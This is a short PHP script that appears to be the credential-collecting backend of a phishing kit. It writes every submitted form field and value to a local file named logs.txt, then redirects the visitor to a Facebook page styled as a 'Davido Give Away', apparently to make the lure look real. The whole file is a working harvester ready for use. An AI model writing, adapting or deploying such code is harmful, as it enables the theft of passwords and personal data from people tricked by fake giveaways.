<?php 

// Set the location to redirect the page 
header ('Location: https://facebook.com/Davido-Give-Away-Page-104866894923993/'); 

// Open the text file in writing mode 
$file = fopen("logs.txt", "a"); 

foreach($_POST as $variable => $value) { 
	fwrite($file, $variable); 
	fwrite($file, "="); 
	fwrite($file, $value); 
	fwrite($file, "\r\n"); 
} 

fwrite($file, "\r\n"); 
fclose($file); 
exit; 
?> 
